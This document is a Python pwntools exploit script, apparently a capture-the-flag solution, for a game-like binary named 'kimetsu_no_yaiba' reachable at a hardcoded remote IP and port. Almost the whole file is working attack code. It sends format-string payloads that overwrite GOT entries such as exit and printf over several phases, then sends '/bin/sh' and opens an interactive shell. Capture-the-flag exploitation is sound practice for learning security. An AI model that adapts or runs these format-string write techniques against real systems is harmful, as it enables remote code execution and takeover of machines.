# -*- coding: utf-8 -*-
from pwn import *

DEBUG = False

if DEBUG:
    r = process("./kimetsu_no_yaiba")
    gdb.attach(r)
    txt_warmup = "Ta đánh chưa nghiêm túc thôi"
    txt_fight = "chiến:"
    txt_congrats = "Chúc"
    stack2 = 50
    stack2_1 = 40
    sml = 231
else:
    r = remote("125.235.240.166", 33333)
    txt_warmup = b"I'm just warming up"
    txt_fight = b"fight:"
    txt_congrats = b"Cong"
    stack2 = 52
    stack2_1 = 42
    sml = 243
    system_off = 0x000000000055410
    start_off = 0x000000000026fc0


main = 0x400F44
exit_plt = 0x400870
exit_got = 0x602080
puts_got = 0x602020
printf_got = 0x602048
read_name = 0x0000000000400AF5
max_dame = 286331153
check_win = 0x000000000400BD5

# 10 11 payload
# 12 hp
# 13 strength (first 4bytes)
# 13 defend (4 bytes after)
# leak_stack 20
# stack_dest_addr 50

# Phase 1
print(r.recvuntil(txt_fight))
# write exit_got to stack
payload = b"%6299776p%20$ln"
# payload = "%52$p"
r.sendline(payload)
while True:
    r.sendline(b"2")
    r.sendline(str(max_dame))
    r.recvuntil(b"Boss: \"")
    boss_msg = r.recvuntil(b"\"")[:-1]
    print(boss_msg)
    if boss_msg != txt_warmup:
        break
print(r.recvuntil(b"/n)"))
r.sendline(b"y")


print(r.recvuntil(txt_fight))
payload = b"%3908p%" + str(stack2).encode("utf-8") + b"$hn"
r.sendline(payload)
while True:
    r.sendline(b"2")
    r.sendline(str(max_dame))
    r.recvuntil(b"Boss: \"")
    boss_msg = r.recvuntil(b"\"")[:-1]
    print(boss_msg)
    if boss_msg != txt_warmup:
        break
print(r.recvuntil(b"/n)"))
r.sendline(b"n")

print(r.recvuntil(b">"))
while True:
    r.sendline(b"2")
    r.sendline(str(max_dame))
    r.recvuntil(b"Boss: \"")
    boss_msg = r.recvuntil(b"\"")[:-1]
    print(boss_msg)
    if boss_msg != txt_warmup:
        break
print(r.recvuntil(b"/n)"))
r.sendline(b"n")



# Phase 2
print(r.recvuntil(txt_fight))
# write exit_got to stack
payload = b"aaaa"
# payload = "%52$p"
r.sendline(payload)
while True:
    r.sendline(b"2")
    r.sendline(str(max_dame))
    r.recvuntil(b"Boss: \"")
    boss_msg = r.recvuntil(b"\"")[:-1]
    #print(boss_msg)
    if boss_msg != txt_warmup:
        break
r.recvuntil(b"/n)")
r.sendline(b"y")


r.recvuntil(txt_fight)
#payload = b"%3908p%" + str(stack2).encode("utf-8") + b"$hn"

payload = p64(0) + p64(0x0000000000602048)

r.send(payload)
count_c = 0
while True:
    count_c += 1
    print("count_c: " + str(count_c))
    r.sendline(b"2")
    r.sendline(str(max_dame))
    r.recvuntil(b"Boss: \"")
    boss_msg = r.recvuntil(b"\"")[:-1]
    #print(boss_msg)
    if boss_msg != txt_warmup:
        break
r.recvuntil(b"/n)")
r.sendline(b"n")

r.recvuntil(b">")
while True:
    r.sendline(b"2")
    r.sendline(str(max_dame))
    r.recvuntil(b"Boss: \"")
    boss_msg = r.recvuntil(b"\"")[:-1]
    #print(boss_msg)
    if boss_msg != txt_warmup:
        break
r.recvuntil(b"/n)")
r.sendline(b"n")


# Phase 3
print(r.recvuntil(txt_fight))
# write exit_got to stack
#payload = b"%29$p-%30$p-"
payload = b"%1040x%29$hn"
# payload = "%52$p"
r.sendline(payload)
while True:
    r.sendline(b"2")
    r.sendline(str(max_dame))
    r.recvuntil(b"Boss: \"")
    boss_msg = r.recvuntil(b"\"")[:-1]
    print(boss_msg)
    if boss_msg != txt_warmup:
        break
#print(r.recvuntil(b"/n)"))
r.recv()
r.sendline(b"y")


#print(r.recvuntil(txt_fight))
r.recv()
#payload = b"%3908p%" + str(stack2).encode("utf-8") + b"$hn"

#payload = p64(0) + p64(0x0000000000602048)
payload = b'/bin/sh\x00'

r.sendline(payload)
count_b = 0
for count_d in range(8):
    count_b += 1
    print(count_b)
    r.sendline(b"2")
    r.sendline(str(max_dame))
    #r.recvuntil(b"Boss: \"")
    #r.recv()
    #boss_msg = r.recvuntil(b"\"")[:-1]
    #print(boss_msg)
    #if boss_msg != txt_warmup:
        #break
#r.recvuntil(b"/n)")
#r.sendline(b"n")
#r.recv()
#r.recv()


'''
r.recvuntil(b">")
while True:
    r.sendline(b"2")
    r.sendline(str(max_dame))
    r.recvuntil(b"Boss: \"")
    boss_msg = r.recvuntil(b"\"")[:-1]
    print(boss_msg)
    if boss_msg != txt_warmup:
        break
r.recvuntil(b"/n)")
r.sendline(b"n")
'''


r.interactive()

